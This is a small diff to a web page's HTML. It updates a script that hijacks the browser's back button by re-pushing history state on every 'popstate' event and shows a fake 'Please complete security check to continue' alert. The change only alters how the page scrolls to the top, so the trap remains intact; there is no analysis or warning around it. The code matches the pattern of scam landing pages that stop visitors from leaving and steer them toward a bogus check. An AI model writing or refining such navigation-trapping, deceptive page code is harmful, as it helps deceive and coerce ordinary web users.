@@ -11,7 +11,7 @@
     setTimeout("preventBack()", 0);
     window.onunload=function(){ void (0) };
 </script>
-<script type='text/javascript'> setTimeout(function back() { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); document.body.scrollTop = 0; document.documentElement.scrollTop = 0; alert('One more step | Please complete security check to continue !'); }); }, 500) </script>
+<script type='text/javascript'> setTimeout(function back() { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); window.scrollTo(0, 0); alert('One more step | Please complete security check to continue !'); }); }, 500) </script>
 
 <style>
 html, body { font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; }
